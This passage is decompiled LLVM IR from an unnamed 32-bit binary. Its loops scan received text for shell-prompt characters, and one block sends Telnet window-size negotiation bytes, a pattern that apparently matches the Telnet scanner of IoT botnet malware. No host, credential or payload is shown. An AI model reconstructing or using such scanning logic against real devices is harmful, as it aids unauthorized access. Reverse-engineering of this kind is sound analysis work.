  %v2_804f972 = inttoptr i32 %v1_804f972 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8053e82.25 to i32), i32* %v2_804f972, align 4
  %v0_804f977 = load i32, i32* @edi, align 4
  %v1_804f977 = add i32 %v0_804f977, 4
  %v2_804f977 = inttoptr i32 %v1_804f977 to i32*
  %v3_804f977 = load i32, i32* %v2_804f977, align 4
  %v2_804f97a = add i32 %v0_804f968, 16
  %v3_804f97a = inttoptr i32 %v2_804f97a to i32*
  store i32 %v3_804f977, i32* %v3_804f97a, align 4
  %v0_804f97b = call i32 @function_8051c16()
  store i32 %v0_804f97b, i32* %eax.global-to-local, align 4
  %v0_804f980 = load i32, i32* @esp, align 4
  %v1_804f980 = inttoptr i32 %v0_804f980 to i32*
  store i32 4, i32* %v1_804f980, align 4
  %v0_804f987 = call i32 @function_8050970()
  store i32 %v0_804f987, i32* %eax.global-to-local, align 4
  %v0_804f98f = load i32, i32* @edi, align 4
  %v1_804f98f = add i32 %v0_804f98f, 12
  %v2_804f98f = inttoptr i32 %v1_804f98f to i32*
  store i32 8, i32* %v2_804f98f, align 4
  br label %dec_label_pc_804faab

dec_label_pc_804f99b:                             ; preds = %dec_label_pc_804f5e0
  %v1_804f99b = add i32 %v0_804f5e0, 24
  %v2_804f99b = inttoptr i32 %v1_804f99b to i32*
  %v3_804f99b = load i32, i32* %v2_804f99b, align 4
  %v1_804f99e = add i32 %v3_804f99b, -1
  store i32 %v1_804f99e, i32* %eax.global-to-local, align 4
  %tmp154 = icmp slt i32 %v1_804f99e, 1
  br i1 %tmp154, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804f9a7.preheader

dec_label_pc_804f9a7.preheader:                   ; preds = %dec_label_pc_804f99b
  %v7_804f9a7.pre = load i32, i32* @edx, align 4
  %v2_804f9a7 = add i32 %v0_804f5e0, 28
  br label %dec_label_pc_804f9a7

dec_label_pc_804f9a7:                             ; preds = %dec_label_pc_804f9a7.preheader, %dec_label_pc_804f9d8
  %v7_804f9a7 = phi i32 [ %v7_804f9a7.pre, %dec_label_pc_804f9a7.preheader ], [ %v9_804f9a7, %dec_label_pc_804f9d8 ]
  %v0_804fc75 = phi i32 [ %v1_804f99e, %dec_label_pc_804f9a7.preheader ], [ %v1_804f9d8, %dec_label_pc_804f9d8 ]
  %v3_804f9a7 = add i32 %v2_804f9a7, %v0_804fc75
  %v4_804f9a7 = inttoptr i32 %v3_804f9a7 to i8*
  %v5_804f9a7 = load i8, i8* %v4_804f9a7, align 1
  %v6_804f9a7 = zext i8 %v5_804f9a7 to i32
  %v8_804f9a7 = and i32 %v7_804f9a7, -256
  %v9_804f9a7 = or i32 %v6_804f9a7, %v8_804f9a7
  store i32 %v9_804f9a7, i32* %edx.global-to-local, align 4
  switch i8 %v5_804f9a7, label %dec_label_pc_804f9d8 [
    i8 58, label %dec_label_pc_804fc75
    i8 62, label %dec_label_pc_804fc75
    i8 36, label %dec_label_pc_804fc75
    i8 35, label %dec_label_pc_804fc75
    i8 37, label %dec_label_pc_804fc75
  ]

dec_label_pc_804f9d8:                             ; preds = %dec_label_pc_804f9a7
  %v1_804f9d8 = add i32 %v0_804fc75, -1
  %v8_804f9d8 = icmp eq i32 %v1_804f9d8, 0
  store i32 %v1_804f9d8, i32* %eax.global-to-local, align 4
  %v1_804f9d9 = icmp eq i1 %v8_804f9d8, false
  br i1 %v1_804f9d9, label %dec_label_pc_804f9a7, label %dec_label_pc_804f56a.backedge

dec_label_pc_804f9e0:                             ; preds = %dec_label_pc_804f5e0
  %v1_804f9e0 = add i32 %v0_804f5e0, 24
  %v2_804f9e0 = inttoptr i32 %v1_804f9e0 to i32*
  %v3_804f9e0 = load i32, i32* %v2_804f9e0, align 4
  %v1_804f9e3 = add i32 %v3_804f9e0, -1
  store i32 %v1_804f9e3, i32* %eax.global-to-local, align 4
  %tmp155 = icmp slt i32 %v1_804f9e3, 1
  br i1 %tmp155, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804f9ec.preheader

dec_label_pc_804f9ec.preheader:                   ; preds = %dec_label_pc_804f9e0
  %v7_804f9ec.pre = load i32, i32* @edx, align 4
  %v2_804f9ec = add i32 %v0_804f5e0, 28
  br label %dec_label_pc_804f9ec

dec_label_pc_804f9ec:                             ; preds = %dec_label_pc_804f9ec.preheader, %dec_label_pc_804fa1d
  %v7_804f9ec = phi i32 [ %v7_804f9ec.pre, %dec_label_pc_804f9ec.preheader ], [ %v9_804f9ec, %dec_label_pc_804fa1d ]
  %v0_804fcf2 = phi i32 [ %v1_804f9e3, %dec_label_pc_804f9ec.preheader ], [ %v1_804fa1d, %dec_label_pc_804fa1d ]
  %v3_804f9ec = add i32 %v2_804f9ec, %v0_804fcf2
  %v4_804f9ec = inttoptr i32 %v3_804f9ec to i8*
  %v5_804f9ec = load i8, i8* %v4_804f9ec, align 1
  %v6_804f9ec = zext i8 %v5_804f9ec to i32
  %v8_804f9ec = and i32 %v7_804f9ec, -256
  %v9_804f9ec = or i32 %v6_804f9ec, %v8_804f9ec
  store i32 %v9_804f9ec, i32* %edx.global-to-local, align 4
  switch i8 %v5_804f9ec, label %dec_label_pc_804fa1d [
    i8 58, label %dec_label_pc_804fcf2
    i8 62, label %dec_label_pc_804fcf2
    i8 36, label %dec_label_pc_804fcf2
    i8 35, label %dec_label_pc_804fcf2
    i8 37, label %dec_label_pc_804fcf2
  ]

dec_label_pc_804fa1d:                             ; preds = %dec_label_pc_804f9ec
  %v1_804fa1d = add i32 %v0_804fcf2, -1
  %v8_804fa1d = icmp eq i32 %v1_804fa1d, 0
  store i32 %v1_804fa1d, i32* %eax.global-to-local, align 4
  %v1_804fa1e = icmp eq i1 %v8_804fa1d, false
  br i1 %v1_804fa1e, label %dec_label_pc_804f9ec, label %dec_label_pc_804f56a.backedge

dec_label_pc_804fa25:                             ; preds = %dec_label_pc_804f5e0
  %v0_804fa25 = load i32, i32* @esp, align 4
  %v1_804fa28 = add i32 %v0_804fa25, -16
  %v2_804fa28 = inttoptr i32 %v1_804fa28 to i32*
  store i32 10, i32* %v2_804fa28, align 4
  %v0_804fa2a = call i32 @function_80509f0()
  store i32 %v0_804fa2a, i32* %eax.global-to-local, align 4
  %v0_804fa2f = load i32, i32* @esp, align 4
  %v1_804fa2f = inttoptr i32 %v0_804fa2f to i32*
  %v2_804fa2f = load i32, i32* %v1_804fa2f, align 4
  store i32 %v2_804fa2f, i32* %eax.global-to-local, align 4
  %v3_804fa2f = add i32 %v0_804fa2f, 4
  %v1_804fa30 = inttoptr i32 %v3_804fa2f to i32*
  %v2_804fa30 = load i32, i32* %v1_804fa30, align 4
  store i32 %v2_804fa30, i32* %edx.global-to-local, align 4
  %v1_804fa31 = add i32 %v0_804fa2f, 1944
  store i32 %v1_804fa31, i32* %eax.global-to-local, align 4
  store i32 %v1_804fa31, i32* %v1_804fa30, align 4
  store i32 10, i32* %v1_804fa2f, align 4
  %v0_804fa3b = call i32 @function_8050940()
  store i32 %v0_804fa3b, i32* %eax.global-to-local, align 4
  %v0_804fa40 = load i32, i32* @esp, align 4
  %v1_804fa40 = add i32 %v0_804fa40, 1944
  %v2_804fa40 = inttoptr i32 %v1_804fa40 to i32*
  %v3_804fa40 = load i32, i32* %v2_804fa40, align 4
  %v1_804fa47 = add i32 %v3_804fa40, -1
  store i32 %v1_804fa47, i32* %edx.global-to-local, align 4
  %v2_804fa48 = add i32 %v0_804fa40, -4
  %v3_804fa48 = inttoptr i32 %v2_804fa48 to i32*
  store i32 %v1_804fa47, i32* %v3_804fa48, align 4
  %v2_804fa49 = add i32 %v0_804fa40, -8
  %v3_804fa49 = inttoptr i32 %v2_804fa49 to i32*
  store i32 %v0_804fa3b, i32* %v3_804fa49, align 4
  %v0_804fa4a = load i32, i32* @edi, align 4
  %v1_804fa4a = add i32 %v0_804fa4a, 24
  %v2_804fa4a = inttoptr i32 %v1_804fa4a to i32*
  %v3_804fa4a = load i32, i32* %v2_804fa4a, align 4
  store i32 %v3_804fa4a, i32* %eax.global-to-local, align 4
  %v2_804fa4d = add i32 %v0_804fa40, -12
  %v3_804fa4d = inttoptr i32 %v2_804fa4d to i32*
  store i32 %v3_804fa4a, i32* %v3_804fa4d, align 4
  %v1_804fa4e = add i32 %v0_804fa40, 36
  %v2_804fa4e = inttoptr i32 %v1_804fa4e to i32*
  %v3_804fa4e = load i32, i32* %v2_804fa4e, align 4
  store i32 %v3_804fa4e, i32* %eax.global-to-local, align 4
  %v2_804fa52 = add i32 %v0_804fa40, -16
  %v3_804fa52 = inttoptr i32 %v2_804fa52 to i32*
  store i32 %v3_804fa4e, i32* %v3_804fa52, align 4
  %v0_804fa53 = call i32 @function_8051070()
  %v0_804fa58 = load i32, i32* @esp, align 4
  %v1_804fa5b = add i32 %v0_804fa53, 1
  %v8_804fa5b = icmp eq i32 %v1_804fa5b, 0
  store i32 %v1_804fa5b, i32* %eax.global-to-local, align 4
  %v1_804feb7 = add i32 %v0_804fa58, 16
  %v2_804feb7 = inttoptr i32 %v1_804feb7 to i32*
  store i32 10, i32* %v2_804feb7, align 4
  %v0_804feb9 = call i32 @function_8050970()
  store i32 %v0_804feb9, i32* %eax.global-to-local, align 4
  %v0_804febe = load i32, i32* @esp, align 4
  %v1_804febe = inttoptr i32 %v0_804febe to i32*
  br i1 %v8_804fa5b, label %dec_label_pc_804feb4, label %dec_label_pc_804fa62

dec_label_pc_804fa62:                             ; preds = %dec_label_pc_804fa25
  %v2_804fa6c = load i32, i32* %v1_804febe, align 4
  store i32 %v2_804fa6c, i32* %eax.global-to-local, align 4
  %v0_804fa6d = load i32, i32* @edi, align 4
  %v1_804fa6d = add i32 %v0_804fa6d, 4
  %v2_804fa6d = inttoptr i32 %v1_804fa6d to i32*
  %v3_804fa6d = load i32, i32* %v2_804fa6d, align 4
  store i32 %v3_804fa6d, i32* %eax.global-to-local, align 4
  store i32 %v3_804fa6d, i32* %v1_804febe, align 4
  %v1_804fa71 = call i32 @function_80514e3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804fa71, i32* %eax.global-to-local, align 4
  %v0_804fa76 = load i32, i32* @edi, align 4
  %v1_804fa76 = add i32 %v0_804fa76, 284
  %v2_804fa76 = inttoptr i32 %v1_804fa76 to i8*
  %v3_804fa76 = load i8, i8* %v2_804fa76, align 1
  %v4_804fa76 = zext i8 %v3_804fa76 to i32
  %v6_804fa76 = and i32 %v1_804fa71, -256
  %v7_804fa76 = or i32 %v4_804fa76, %v6_804fa76
  %v1_804fa7f = add i32 %v7_804fa76, 1
  store i32 %v1_804fa7f, i32* %eax.global-to-local, align 4
  %v1_804fa80 = add i32 %v0_804fa76, 4
  %v2_804fa80 = inttoptr i32 %v1_804fa80 to i32*
  store i32 -1, i32* %v2_804fa80, align 4
  %v0_804fa87 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fa87 = trunc i32 %v0_804fa87 to i8
  %v2_804fa87 = load i32, i32* @edi, align 4
  %v3_804fa87 = add i32 %v2_804fa87, 284
  %v4_804fa87 = inttoptr i32 %v3_804fa87 to i8*
  store i8 %v1_804fa87, i8* %v4_804fa87, align 1
  %v0_804fa8d = load i32, i32* %eax.global-to-local, align 4
  %v1_804fa8d = trunc i32 %v0_804fa8d to i8
  %v10_804fa8d = icmp eq i8 %v1_804fa8d, 10
  %v1_804fa8f = icmp eq i1 %v10_804fa8d, false
  %v0_804ff83 = load i32, i32* @edi, align 4
  br i1 %v1_804fa8f, label %dec_label_pc_804ff83, label %dec_label_pc_804fa95

dec_label_pc_804fa95:                             ; preds = %dec_label_pc_804fa62
  %v1_804fa95 = add i32 %v0_804ff83, 284
  %v2_804fa95 = inttoptr i32 %v1_804fa95 to i8*
  store i8 0, i8* %v2_804fa95, align 1
  %v0_804fa9c = load i32, i32* @edi, align 4
  %v1_804fa9c = add i32 %v0_804fa9c, 12
  %v2_804fa9c = inttoptr i32 %v1_804fa9c to i32*
  store i32 0, i32* %v2_804fa9c, align 4
  %v0_804faa3 = load i32, i32* @esp, align 4
  %v1_804faa3 = add i32 %v0_804faa3, 36
  %v2_804faa3 = inttoptr i32 %v1_804faa3 to i32*
  store i32 -1, i32* %v2_804faa3, align 4
  br label %dec_label_pc_804faab

dec_label_pc_804faab:                             ; preds = %dec_label_pc_804fb29, %dec_label_pc_804fe67, %dec_label_pc_804ff83, %dec_label_pc_804ff43, %dec_label_pc_804fd0a, %dec_label_pc_804fc8d, %dec_label_pc_804f936, %dec_label_pc_804f87b, %dec_label_pc_804fd87, %dec_label_pc_804f7a3, %dec_label_pc_804f68d, %dec_label_pc_804fa95
  %v0_804faab = load i32, i32* @edi, align 4
  %v1_804faab = add i32 %v0_804faab, 24
  %v2_804faab = inttoptr i32 %v1_804faab to i32*
  %v3_804faab = load i32, i32* %v2_804faab, align 4
  store i32 %v3_804faab, i32* @edx, align 4
  store i32 %v3_804faab, i32* %eax.global-to-local, align 4
  %v1_804fab0 = load i32, i32* @esp, align 4
  %v2_804fab0 = add i32 %v1_804fab0, 36
  %v3_804fab0 = inttoptr i32 %v2_804fab0 to i32*
  %v4_804fab0 = load i32, i32* %v3_804fab0, align 4
  %v5_804fab0 = sub i32 %v3_804faab, %v4_804fab0
  %v11_804fab0 = xor i32 %v4_804fab0, %v3_804faab
  %v12_804fab0 = xor i32 %v5_804fab0, %v3_804faab
  %v13_804fab0 = and i32 %v12_804fab0, %v11_804fab0
  %v14_804fab0 = icmp slt i32 %v13_804fab0, 0
  %v15_804fab0 = icmp eq i32 %v5_804fab0, 0
  %v16_804fab0 = icmp slt i32 %v5_804fab0, 0
  %v3_804fab4 = icmp ne i1 %v16_804fab0, %v14_804fab0
  %v4_804fab4 = or i1 %v15_804fab0, %v3_804fab4
  br i1 %v4_804fab4, label %dec_label_pc_804faba, label %dec_label_pc_804fab6

dec_label_pc_804fab6:                             ; preds = %dec_label_pc_804faab
  store i32 %v4_804fab0, i32* @edx, align 4
  br label %dec_label_pc_804faba

dec_label_pc_804faba:                             ; preds = %dec_label_pc_804faab, %dec_label_pc_804fab6
  %v1_804faba = phi i32 [ %v3_804faab, %dec_label_pc_804faab ], [ %v4_804fab0, %dec_label_pc_804fab6 ]
  %v2_804faba = sub i32 %v3_804faab, %v1_804faba
  store i32 %v2_804faba, i32* %eax.global-to-local, align 4
  store i32 %v2_804faba, i32* %v2_804faab, align 4
  %v0_804fabf = load i32, i32* @esi, align 4
  %v1_804fabf = load i32, i32* @esp, align 4
  %v2_804fabf = add i32 %v1_804fabf, -4
  %v3_804fabf = inttoptr i32 %v2_804fabf to i32*
  store i32 %v0_804fabf, i32* %v3_804fabf, align 4
  %v0_804fac0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fac0 = add i32 %v1_804fabf, -8
  %v3_804fac0 = inttoptr i32 %v2_804fac0 to i32*
  store i32 %v0_804fac0, i32* %v3_804fac0, align 4
  %v1_804fac1 = add i32 %v1_804fabf, 20
  %v2_804fac1 = inttoptr i32 %v1_804fac1 to i32*
  %v3_804fac1 = load i32, i32* %v2_804fac1, align 4
  %v1_804fac5 = load i32, i32* @edx, align 4
  %v2_804fac5 = add i32 %v1_804fac5, %v3_804fac1
  store i32 %v2_804fac5, i32* %eax.global-to-local, align 4
  %v2_804fac7 = add i32 %v1_804fabf, -12
  %v3_804fac7 = inttoptr i32 %v2_804fac7 to i32*
  store i32 %v2_804fac5, i32* %v3_804fac7, align 4
  %v3_804fac8 = load i32, i32* %v2_804fac1, align 4
  store i32 %v3_804fac8, i32* @ebx, align 4
  %v2_804facc = add i32 %v1_804fabf, -16
  %v3_804facc = inttoptr i32 %v2_804facc to i32*
  store i32 %v3_804fac8, i32* %v3_804facc, align 4
  %v4_804facd = call i32 @function_8051a45(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804facd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f5e0

dec_label_pc_804fada:                             ; preds = %dec_label_pc_804f5e0
  %v1_804fada = add i32 %v0_804f5e0, 24
  %v2_804fada = inttoptr i32 %v1_804fada to i32*
  %v3_804fada = load i32, i32* %v2_804fada, align 4
  %v1_804fadd = add i32 %v3_804fada, -1
  store i32 %v1_804fadd, i32* %eax.global-to-local, align 4
  %tmp156 = icmp slt i32 %v1_804fadd, 1
  br i1 %tmp156, label %dec_label_pc_804fdf8, label %dec_label_pc_804fae6.preheader

dec_label_pc_804fae6.preheader:                   ; preds = %dec_label_pc_804fada
  %v7_804fae6.pre = load i32, i32* @edx, align 4
  %v2_804fae6 = add i32 %v0_804f5e0, 28
  br label %dec_label_pc_804fae6

dec_label_pc_804fae6:                             ; preds = %dec_label_pc_804fae6.preheader, %dec_label_pc_804fb0e
  %v7_804fae6 = phi i32 [ %v7_804fae6.pre, %dec_label_pc_804fae6.preheader ], [ %v9_804fae6, %dec_label_pc_804fb0e ]
  %v0_804fdec = phi i32 [ %v1_804fadd, %dec_label_pc_804fae6.preheader ], [ %v1_804fb0e, %dec_label_pc_804fb0e ]
  %v3_804fae6 = add i32 %v2_804fae6, %v0_804fdec
  %v4_804fae6 = inttoptr i32 %v3_804fae6 to i8*
  %v5_804fae6 = load i8, i8* %v4_804fae6, align 1
  %v6_804fae6 = zext i8 %v5_804fae6 to i32
  %v8_804fae6 = and i32 %v7_804fae6, -256
  %v9_804fae6 = or i32 %v6_804fae6, %v8_804fae6
  store i32 %v9_804fae6, i32* %edx.global-to-local, align 4
  switch i8 %v5_804fae6, label %dec_label_pc_804fb0e [
    i8 58, label %dec_label_pc_804fdec
    i8 62, label %dec_label_pc_804fdec
    i8 36, label %dec_label_pc_804fdec
    i8 35, label %dec_label_pc_804fdec
  ]

dec_label_pc_804fb0e:                             ; preds = %dec_label_pc_804fae6
  %v1_804fb0e = add i32 %v0_804fdec, -1
  %v8_804fb0e = icmp eq i32 %v1_804fb0e, 0
  store i32 %v1_804fb0e, i32* %eax.global-to-local, align 4
  %v1_804fb0f = icmp eq i1 %v8_804fb0e, false
  br i1 %v1_804fb0f, label %dec_label_pc_804fae6, label %dec_label_pc_804fdf8

dec_label_pc_804fb16:                             ; preds = %dec_label_pc_804f617
  %v1_804fb16 = add i32 %v1_804fb20, 36
  %v2_804fb16 = inttoptr i32 %v1_804fb16 to i32*
  %v3_804fb16 = load i32, i32* %v2_804fb16, align 4
  %v1_804fb1a = add i32 %v0_804f605, 2
  store i32 %v1_804fb1a, i32* @ebx, align 4
  %v1_804fb1d = add i32 %v3_804fb16, 2
  store i32 %v1_804fb1d, i32* %esi.global-to-local, align 4
  store i32 %v1_804fb1d, i32* %v2_804fb16, align 4
  %v4_804f5ff.pre.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_804f5ff.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f5ff.backedge

dec_label_pc_804f5ff.backedge:                    ; preds = %dec_label_pc_804fb16, %dec_label_pc_804ff97
  %v0_804f5ff = phi i32 [ %v0_804f5ff.pre, %dec_label_pc_804fb16 ], [ %v1_804ffd5, %dec_label_pc_804ff97 ]
  %v4_804f5ff.be = phi i32 [ %v4_804f5ff.pre.pre, %dec_label_pc_804fb16 ], [ %v3_804ffd8, %dec_label_pc_804ff97 ]
  %v1_804f5ff = add i32 %v0_804f5ff, 36
  %v2_804f5ff = inttoptr i32 %v1_804f5ff to i32*
  %v3_804f5ff = load i32, i32* %v2_804f5ff, align 4
  %v5_804f5ff = sub i32 %v3_804f5ff, %v4_804f5ff.be
  %v11_804f5ff = xor i32 %v3_804f5ff, %v4_804f5ff.be
  %v12_804f5ff = xor i32 %v5_804f5ff, %v3_804f5ff
  %v13_804f5ff = and i32 %v12_804f5ff, %v11_804f5ff
  %v14_804f5ff = icmp slt i32 %v13_804f5ff, 0
  %v16_804f5ff = icmp slt i32 %v5_804f5ff, 0
  %v2_804f603 = icmp eq i1 %v16_804f5ff, %v14_804f5ff
  br i1 %v2_804f603, label %dec_label_pc_804f681, label %dec_label_pc_804f605.preheader

dec_label_pc_804fb29:                             ; preds = %dec_label_pc_804fe5b, %dec_label_pc_804ff0f, %dec_label_pc_804fcfe, %dec_label_pc_804fc81, %dec_label_pc_804f92a, %dec_label_pc_804f86f, %dec_label_pc_804fd7b, %dec_label_pc_804f797, %dec_label_pc_804f681
  %v0_804fb29 = phi i32 [ %v0_804fe6b, %dec_label_pc_804fe5b ], [ %v1_804ff01, %dec_label_pc_804ff0f ], [ %v0_804fcfe, %dec_label_pc_804fcfe ], [ %v0_804fc81, %dec_label_pc_804fc81 ], [ %v0_804f92a, %dec_label_pc_804f92a ], [ %v0_804f86f, %dec_label_pc_804f86f ], [ %v0_804fd7b, %dec_label_pc_804fd7b ], [ %v0_804f7a7, %dec_label_pc_804f797 ], [ %v0_804f681, %dec_label_pc_804f681 ]
  %v1_804fb29 = add i32 %v0_804fb29, 36
  %v2_804fb29 = inttoptr i32 %v1_804fb29 to i32*
  %v3_804fb29 = load i32, i32* %v2_804fb29, align 4
  %v1_804fb2d = icmp eq i32 %v3_804fb29, 0
  %v1_804fb2f = icmp eq i1 %v1_804fb2d, false
  br i1 %v1_804fb2f, label %dec_label_pc_804faab, label %dec_label_pc_804f56a.backedge

dec_label_pc_804fb40:                             ; preds = %dec_label_pc_804f631
  store i8 -4, i8* %v1_804f631, align 1
  %v0_804fb43 = load i32, i32* @ebx, align 4
  %v1_804fb43 = add i32 %v0_804fb43, 2
  %v2_804fb43 = inttoptr i32 %v1_804fb43 to i8*
  %v3_804fb43 = load i8, i8* %v2_804fb43, align 1
  %v4_804fb43 = zext i8 %v3_804fb43 to i32
  %v5_804fb43 = load i32, i32* %eax.global-to-local, align 4
  %v6_804fb43 = and i32 %v5_804fb43, -256
  %v7_804fb43 = or i32 %v6_804fb43, %v4_804fb43
  store i32 %v7_804fb43, i32* %eax.global-to-local, align 4
  %v11_804fb46 = icmp eq i8 %v3_804fb43, -3
  %v1_804fb48 = icmp eq i1 %v11_804fb46, false
  br i1 %v1_804fb48, label %dec_label_pc_804f64e, label %dec_label_pc_804fb4e

dec_label_pc_804fb4e:                             ; preds = %dec_label_pc_804fb40, %dec_label_pc_804f643
  %v0_804fb4e = phi i32 [ %v0_804fb43, %dec_label_pc_804fb40 ], [ %v0_804f643, %dec_label_pc_804f643 ]
  %v1_804fb4e = add i32 %v0_804fb4e, 2
  %v2_804fb4e = inttoptr i32 %v1_804fb4e to i8*
  store i8 -4, i8* %v2_804fb4e, align 1
  br label %dec_label_pc_804f656

dec_label_pc_804fb57:                             ; preds = %dec_label_pc_804f617
  %v1_804fb57 = add i32 %v1_804fb20, 1943
  %v2_804fb57 = inttoptr i32 %v1_804fb57 to i8*
  store i8 -1, i8* %v2_804fb57, align 1
  %v0_804fb5f = load i32, i32* @esp, align 4
  %v1_804fb5f = add i32 %v0_804fb5f, 1944
  %v2_804fb5f = inttoptr i32 %v1_804fb5f to i8*
  store i8 -5, i8* %v2_804fb5f, align 1
  %v0_804fb67 = load i32, i32* @esp, align 4
  %v1_804fb67 = add i32 %v0_804fb67, 1945
  %v2_804fb67 = inttoptr i32 %v1_804fb67 to i8*
  store i8 31, i8* %v2_804fb67, align 1
  %v0_804fb6f = load i32, i32* @esp, align 4
  %v1_804fb6f = add i32 %v0_804fb6f, 1911
  %v2_804fb6f = inttoptr i32 %v1_804fb6f to i8*
  store i8 -1, i8* %v2_804fb6f, align 1
  %v0_804fb77 = load i32, i32* @esp, align 4
  %v1_804fb77 = add i32 %v0_804fb77, 1912
  %v2_804fb77 = inttoptr i32 %v1_804fb77 to i8*
  store i8 -6, i8* %v2_804fb77, align 1
  %v0_804fb7f = load i32, i32* @esp, align 4
  %v1_804fb7f = add i32 %v0_804fb7f, 1913
  %v2_804fb7f = inttoptr i32 %v1_804fb7f to i8*
  store i8 31, i8* %v2_804fb7f, align 1
  %v0_804fb87 = load i32, i32* @esp, align 4
  %v1_804fb87 = add i32 %v0_804fb87, 1914
  %v2_804fb87 = inttoptr i32 %v1_804fb87 to i8*
  store i8 0, i8* %v2_804fb87, align 1
  %v0_804fb8f = load i32, i32* @esp, align 4
  %v1_804fb8f = add i32 %v0_804fb8f, 1915
  %v2_804fb8f = inttoptr i32 %v1_804fb8f to i8*
  store i8 80, i8* %v2_804fb8f, align 1
  %v0_804fb97 = load i32, i32* @esp, align 4
  %v1_804fb97 = add i32 %v0_804fb97, 1916
  %v2_804fb97 = inttoptr i32 %v1_804fb97 to i8*
  store i8 0, i8* %v2_804fb97, align 1
  %v0_804fb9f = load i32, i32* @esp, align 4
  %v1_804fb9f = add i32 %v0_804fb9f, 1917
  %v2_804fb9f = inttoptr i32 %v1_804fb9f to i8*
  store i8 24, i8* %v2_804fb9f, align 1
  %v0_804fba7 = load i32, i32* @esp, align 4
  %v1_804fba7 = add i32 %v0_804fba7, 1918
  %v2_804fba7 = inttoptr i32 %v1_804fba7 to i8*
  store i8 -1, i8* %v2_804fba7, align 1
  %v0_804fbaf = load i32, i32* @esp, align 4
  %v1_804fbaf = add i32 %v0_804fbaf, 1919
  %v2_804fbaf = inttoptr i32 %v1_804fbaf to i8*
  store i8 -16, i8* %v2_804fbaf, align 1
  %v0_804fbb7 = load i32, i32* @esp, align 4
  %v1_804fbb7 = add i32 %v0_804fbb7, 20
  %v2_804fbb7 = inttoptr i32 %v1_804fbb7 to i32*
  %v3_804fbb7 = load i32, i32* %v2_804fbb7, align 4
  store i32 %v3_804fbb7, i32* %eax.global-to-local, align 4
  %v0_804fbbb = load i32, i32* @edi, align 4
  %v1_804fbbb = add i32 %v0_804fbbb, 24
  %v2_804fbbb = inttoptr i32 %v1_804fbbb to i32*
  %v3_804fbbb = load i32, i32* %v2_804fbbb, align 4
  store i32 %v3_804fbbb, i32* %ecx.global-to-local, align 4
  %v0_804fbbe = load i32, i32* @ebx, align 4
  %v1_804fbbe = add i32 %v0_804fbbe, 2
  store i32 %v1_804fbbe, i32* %edx.global-to-local, align 4
  %v2_804fbc1 = add i32 %v3_804fbbb, %v3_804fbb7
  store i32 %v2_804fbc1, i32* %eax.global-to-local, align 4
  %tmp770 = icmp ugt i32 %v2_804fbc1, %v1_804fbbe
  br i1 %tmp770, label %dec_label_pc_804fbcb, label %dec_label_pc_804f681

dec_label_pc_804fbcb:                             ; preds = %dec_label_pc_804fb57
  %v2_804fbcb = inttoptr i32 %v1_804fbbe to i8*
  %v3_804fbcb = load i8, i8* %v2_804fbcb, align 1
  %v12_804fbcb = icmp eq i8 %v3_804fbcb, 31
  br i1 %v12_804fbcb, label %dec_label_pc_804ff97, label %dec_label_pc_804fbd5

dec_label_pc_804fbd5:                             ; preds = %dec_label_pc_804fbcb
  %v1_804fbd5 = inttoptr i32 %v0_804fbbe to i8*
  %v2_804fbd5 = load i8, i8* %v1_804fbd5, align 1
  %v3_804fbd5 = zext i8 %v2_804fbd5 to i32
  %v5_804fbd5 = and i32 %v2_804fbc1, -256
  %v6_804fbd5 = or i32 %v3_804fbd5, %v5_804fbd5
  store i32 %v6_804fbd5, i32* %eax.global-to-local, align 4
  %v11_804fbd7 = icmp eq i8 %v2_804fbd5, -3
  %v1_804fbd9 = icmp eq i1 %v11_804fbd7, false
  br i1 %v1_804fbd9, label %dec_label_pc_804fff3, label %dec_label_pc_804fbdf

dec_label_pc_804fbdf:                             ; preds = %dec_label_pc_804fbd5
  store i8 -4, i8* %v1_804fbd5, align 1
  br label %dec_label_pc_804f631

dec_label_pc_804fbe7:                             ; preds = %dec_label_pc_804f589
  %v1_804f5b6 = icmp eq i32 %v0_804f5ae, 0
  br i1 %v1_804f5b6, label %dec_label_pc_805006d, label %dec_label_pc_804fbed

dec_label_pc_804fbed:                             ; preds = %dec_label_pc_804fbe7
  %v10_804fbed = icmp eq i32 %v0_804f5ae, -1
  %v1_804fbf0 = icmp eq i1 %v10_804fbed, false
  br i1 %v1_804fbf0, label %dec_label_pc_804f5d0, label %dec_label_pc_804fbf6

dec_label_pc_804fbf6:                             ; preds = %dec_label_pc_804fbed
  %v1_804fbf6 = add i32 %v0_804f5b3, 120
  %v2_804fbf6 = inttoptr i32 %v1_804fbf6 to i32*
  %v3_804fbf6 = load i32, i32* %v2_804fbf6, align 4
  store i32 %v3_804fbf6, i32* %edx.global-to-local, align 4
  %v1_804fbfa = inttoptr i32 %v3_804fbf6 to i32*
  %v2_804fbfa = load i32, i32* %v1_804fbfa, align 4
  %v11_804fbfa = icmp eq i32 %v2_804fbfa, 11
  br i1 %v11_804fbfa, label %dec_label_pc_804f47b, label %dec_label_pc_804fc03

dec_label_pc_804fc03:                             ; preds = %dec_label_pc_804fbf6, %dec_label_pc_805006d
  %v0_804fc03 = phi i32 [ %v1_804f5b3, %dec_label_pc_804fbf6 ], [ %v0_804fc03.pre, %dec_label_pc_805006d ]
  %v0_804fc06 = load i32, i32* @edi, align 4
  %v1_804fc06 = add i32 %v0_804fc06, 4
  %v2_804fc06 = inttoptr i32 %v1_804fc06 to i32*
  %v3_804fc06 = load i32, i32* %v2_804fc06, align 4
  store i32 %v3_804fc06, i32* %eax.global-to-local, align 4
  %v2_804fc09 = add i32 %v0_804fc03, -16
  %v3_804fc09 = inttoptr i32 %v2_804fc09 to i32*
  store i32 %v3_804fc06, i32* %v3_804fc09, align 4
  %v1_804fc0a = call i32 @function_80514e3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804fc0a, i32* %eax.global-to-local, align 4
  %v0_804fc0f = load i32, i32* @edi, align 4
  %v1_804fc0f = add i32 %v0_804fc0f, 284
  %v2_804fc0f = inttoptr i32 %v1_804fc0f to i8*
  %v3_804fc0f = load i8, i8* %v2_804fc0f, align 1
  %v4_804fc0f = zext i8 %v3_804fc0f to i32
